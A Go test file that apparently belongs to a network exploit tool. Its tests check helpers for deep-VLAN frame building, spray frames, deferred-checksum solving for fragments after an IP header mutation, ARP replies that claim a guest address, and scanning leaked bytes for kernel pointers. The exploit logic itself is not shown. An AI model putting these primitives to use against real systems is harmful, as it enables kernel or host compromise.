package main

import (
	"encoding/binary"
	"net"
	"testing"
)

func TestEgressSolverAndFragments(t *testing.T) {
	src := net.ParseIP("192.0.2.2").To4()
	dst := net.ParseIP("198.51.100.7").To4()
	payload := bytesRepeat(4008, 0x11)
	for i := 0; i < 8; i++ {
		payload[i] = marker
	}
	if !egressSolve(payload, ipID, src, dst, ipProtoRaw, 0, 0x004f) {
		t.Fatal("solver found no adjustment")
	}
	whole := egressFragment(0, false, payload, ipID, src, dst)
	forwardTTL(whole)
	if got := csumFold(csumPartial(whole)); got != 0x004f {
		t.Fatalf("folded deferred checksum = %#04x, want 0x004f", got)
	}

	frag := egressFragment(8, true, payload[8:1480], ipID, src, dst)
	if got := binary.BigEndian.Uint16(frag[6:]); got != 0x2001 {
		t.Fatalf("fragment field = %#04x, want 0x2001", got)
	}
	if got := int(binary.BigEndian.Uint16(frag[2:])); got != len(frag) {
		t.Fatalf("total length = %d, want %d", got, len(frag))
	}
}

func TestEgressDoubleVLANFrame(t *testing.T) {
	srcMAC, _ := net.ParseMAC("02:00:00:00:00:01")
	dstMAC, _ := net.ParseMAC("02:00:00:00:00:02")
	ip := egressFragment(0, true, bytesRepeat(8, marker), ipID,
		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"))
	frame := egressFrame(ip, srcMAC, dstMAC, 2)
	if got := binary.BigEndian.Uint16(frame[12:]); got != vlanProto {
		t.Fatalf("outer ethertype = %#04x", got)
	}
	if got := binary.BigEndian.Uint16(frame[16:]); got != vlanProto {
		t.Fatalf("inner ethertype = %#04x", got)
	}
	if got := binary.BigEndian.Uint16(frame[20:]); got != ipProtoEth {
		t.Fatalf("payload ethertype = %#04x", got)
	}
	if frame[l2Len] != 0x45 {
		t.Fatalf("IPv4 starts at %d with %#02x", l2Len, frame[l2Len])
	}
}

func TestEgressSprayFrame(t *testing.T) {
	src, _ := net.ParseMAC("02:00:00:00:00:01")
	dst, _ := net.ParseMAC("02:00:00:00:00:02")
	frame := egressSprayFrame(src, dst, 0xee)
	if len(frame) != egressSprayLen {
		t.Fatalf("spray frame length = %d, want %d", len(frame), egressSprayLen)
	}
	if got := binary.BigEndian.Uint16(frame[12:14]); got != ethPExperiment {
		t.Fatalf("spray ethertype = %#04x, want %#04x", got, ethPExperiment)
	}
	for i, b := range frame[ethLen:] {
		if b != 0xee {
			t.Fatalf("spray payload byte %d = %#02x, want 0xee", i, b)
		}
	}
}

func TestRouteEncoding(t *testing.T) {
	ip := net.ParseIP("172.17.0.1").To4()
	if got := routeIPv4(routeUint(ip)); !got.Equal(ip) {
		t.Fatalf("route round trip = %s, want %s", got, ip)
	}
}

func TestIPv4OfDoubleVLANFrame(t *testing.T) {
	srcMAC, _ := net.ParseMAC("02:00:00:00:00:01")
	dstMAC, _ := net.ParseMAC("02:00:00:00:00:02")
	want := egressFragment(0, true, bytesRepeat(8, marker), ipID,
		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"))
	got := ipv4Of(egressFrame(want, srcMAC, dstMAC, 2))
	if len(got) != len(want) || string(got) != string(want) {
		t.Fatalf("decoded IPv4 packet differs: got %x want %x", got, want)
	}
}

func TestDeepVLANFrame(t *testing.T) {
	srcMAC, _ := net.ParseMAC("02:00:00:00:00:01")
	dstMAC, _ := net.ParseMAC("02:00:00:00:00:02")
	want := egressFragment(0, true, bytesRepeat(8, marker), ipID,
		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"))
	frame := egressFrame(want, srcMAC, dstMAC, 69)
	if got := len(frame); got != ethLen+69*vlanLen+len(want) {
		t.Fatalf("deep VLAN frame length = %d", got)
	}
	got := ipv4Of(frame)
	if len(got) != len(want) || string(got) != string(want) {
		t.Fatalf("decoded deep-VLAN IPv4 packet differs: got %x want %x", got, want)
	}
}

func TestKernelPointerCandidates(t *testing.T) {
	leak := make([]byte, 32)
	binary.LittleEndian.PutUint64(leak[10:18], 0xffff947485f7c500)
	got := kernelPointerCandidates(leak)
	if len(got) != 1 || got[0].offset != 10 || got[0].value != 0xffff947485f7c500 {
		t.Fatalf("pointer candidates = %#v", got)
	}
}

func TestARPRequestAndReply(t *testing.T) {
	guestMAC, _ := net.ParseMAC("02:00:00:00:00:02")
	hostMAC, _ := net.ParseMAC("02:00:00:00:00:01")
	guestClaim := net.ParseIP("192.0.2.3").To4()
	hostIP := net.ParseIP("192.0.2.1").To4()
	request := egressARPReply(hostMAC, guestMAC, hostIP, guestClaim)
	binary.BigEndian.PutUint16(request[ethLen+6:ethLen+8], 1)
	copy(request[0:6], []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff})
	requesterMAC, requesterIP, ok := egressARPRequest(request, guestClaim)
	if !ok || requesterMAC.String() != hostMAC.String() || !requesterIP.Equal(hostIP) {
		t.Fatalf("request parse = %s %s %t", requesterMAC, requesterIP, ok)
	}
	reply := egressARPReply(guestMAC, requesterMAC, guestClaim, requesterIP)
	if got := binary.BigEndian.Uint16(reply[12:14]); got != ethPArp {
		t.Fatalf("reply ethertype = %#04x", got)
	}
	arp := reply[ethLen:]
	if got := binary.BigEndian.Uint16(arp[6:8]); got != 2 {
		t.Fatalf("reply opcode = %d", got)
	}
	if !net.IP(arp[14:18]).Equal(guestClaim) || !net.IP(arp[24:28]).Equal(hostIP) {
		t.Fatalf("reply addresses sender=%s target=%s", net.IP(arp[14:18]), net.IP(arp[24:28]))
	}
}

func TestUDPCarrierGeometry(t *testing.T) {
	payload := bytesRepeat(4008, 0x11)
	egressUDPHeaders(payload, 0x0101, 9)
	if !egressSolve(payload, ipID, net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"), ipProtoUDP, 0, 0x004f) {
		t.Fatal("UDP carrier solver found no adjustment")
	}
	whole := egressFragment(0, false, payload, ipID,
		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"), ipProtoUDP)
	forwardTTL(whole)
	if got := csumFold(csumPartial(whole)); got != 0x004f {
		t.Fatalf("UDP folded deferred checksum = %#04x, want 0x004f", got)
	}
	if got := binary.BigEndian.Uint16(payload[0:2]); got != 0x0101 {
		t.Fatalf("initial UDP source port = %#04x", got)
	}
	if got := binary.BigEndian.Uint16(payload[2:4]); got != 9 {
		t.Fatalf("initial UDP destination port = %d", got)
	}
	if got := binary.BigEndian.Uint16(payload[4:6]); got != uint16(len(payload)) {
		t.Fatalf("initial UDP length = %d, want %d", got, len(payload))
	}
	post := payload[mutatedIHL-ipLen:]
	if got := binary.BigEndian.Uint16(post[2:4]); got != 9 {
		t.Fatalf("post-mutation UDP destination port = %d", got)
	}
	if got := binary.BigEndian.Uint16(post[4:6]); got != uint16(len(post)) {
		t.Fatalf("post-mutation UDP length = %d, want %d", got, len(post))
	}
	if payload[0] != 1 || payload[1] != 1 || payload[2] != 0 {
		t.Fatalf("controlled options do not begin NOP,NOP,END: %x", payload[:3])
	}
}

func TestUDPCarrierMalformedTimestampOption(t *testing.T) {
	payload := bytesRepeat(4008, 0x11)
	egressUDPHeaders(payload, 0x4401, 53)
	if payload[0] != 0x44 || payload[1] != 0x01 {
		t.Fatalf("post-mutation option prefix = %x, want 4401", payload[:2])
	}
	if got := binary.BigEndian.Uint16(payload[2:4]); got != 53 {
		t.Fatalf("pre-mutation destination port = %d, want 53", got)
	}
}

func TestTCPCarrierGeometry(t *testing.T) {
	payload := bytesRepeat(4008, 0x11)
	egressTCPHeaders(payload, 0x0100, 443)
	firstBefore := append([]byte(nil), payload[:20]...)
	secondBefore := append([]byte(nil), payload[40:60]...)
	adjustIP := egressAdjustmentIPOffset("tcp")
	if adjustIP != 44 {
		t.Fatalf("TCP adjustment IP offset = %d, want 44", adjustIP)
	}
	if !egressSolveAt(payload, ipID, net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"), ipProtoTCP, 0, 0x004f, adjustIP) {
		t.Fatal("TCP carrier solver found no adjustment")
	}
	whole := egressFragment(0, false, payload, ipID,
		net.ParseIP("192.0.2.2"), net.ParseIP("198.51.100.7"), ipProtoTCP)
	forwardTTL(whole)
	if got := csumFold(csumPartial(whole)); got != 0x004f {
		t.Fatalf("TCP folded deferred checksum = %#04x, want 0x004f", got)
	}
	if string(payload[:20]) != string(firstBefore) {
		t.Fatalf("initial TCP header changed: got %x want %x", payload[:20], firstBefore)
	}
	if string(payload[40:60]) != string(secondBefore) {
		t.Fatalf("post-mutation TCP header changed: got %x want %x", payload[40:60], secondBefore)
	}
	for index, header := range [][]byte{payload[:20], payload[40:60]} {
		if got := binary.BigEndian.Uint16(header[0:2]); got != 0x0100 {
			t.Fatalf("TCP header %d source port = %d", index, got)
		}
		if got := binary.BigEndian.Uint16(header[2:4]); got != 443 {
			t.Fatalf("TCP header %d destination port = %d", index, got)
		}
		if header[12]>>4 != 5 || header[13] != 0x02 {
			t.Fatalf("TCP header %d data offset/flags = %x/%x", index, header[12]>>4, header[13])
		}
		if got := binary.BigEndian.Uint16(header[16:18]); got != 0 {
			t.Fatalf("TCP header %d checksum = %#04x, want zero", index, got)
		}
	}
	if payload[0] != 1 || payload[1] != 0 {
		t.Fatalf("controlled options do not begin NOP,END: %x", payload[:2])
	}
}

func TestDeferredChecksumWordSolver(t *testing.T) {
	for _, desired := range []uint16{0x0000, 0x004f, 0x1234, 0x0001, 0xfffe} {
		payload := bytesRepeat(300, 0x5a)
		if !testo(payload, 0x2222, 0, desired) {
			t.Fatalf("solver found no adjustment for %#04x", desired)
		}
		pkt := datagram(0x2222, payload)
		forwardTTL(pkt)
		if got := csumFold(csumPartial(pkt)); got != desired {
			t.Fatalf("folded checksum = %#04x, want %#04x", got, desired)
		}
	}
	payload := bytesRepeat(300, 0x5a)
	if testo(payload, 0x2222, 0, 0xffff) {
		t.Fatal("solver unexpectedly produced the unattainable 0xffff checksum for a nonempty packet")
	}
}

func TestObservedIDAfterDeferredWrite(t *testing.T) {
	tests := []struct {
		offset int
		word   uint
		want   uint16
	}{
		{offset: 3, word: 0x1234, want: 0x1299},
		{offset: 4, word: 0x1234, want: 0x3412},
		{offset: 5, word: 0x1234, want: 0x9934},
		{offset: 9, word: 0x0006, want: 0x9999},
	}
	for _, tt := range tests {
		c := cfg{csumOffset: tt.offset, csumWord: tt.word}
		if got := observedID(c, 0x9999); got != tt.want {
			t.Errorf("offset %d observed ID = %#04x, want %#04x", tt.offset, got, tt.want)
		}
	}
}

func TestFragmentPreserveMask(t *testing.T) {
	tests := map[int]uint16{
		0:  0xffff,
		1:  0x00ff,
		2:  0x0000,
		3:  0xff00,
		5:  0x00ff,
		6:  0x0000,
		7:  0xff00,
		9:  0x00ff,
		10: 0x0000,
		11: 0xff00,
		12: 0xffff,
		20: 0xffff,
	}
	for offset, want := range tests {
		if got := fragmentPreserveMask(offset); got != want {
			t.Errorf("offset %d mask = %#04x, want %#04x", offset, got, want)
		}
	}
}
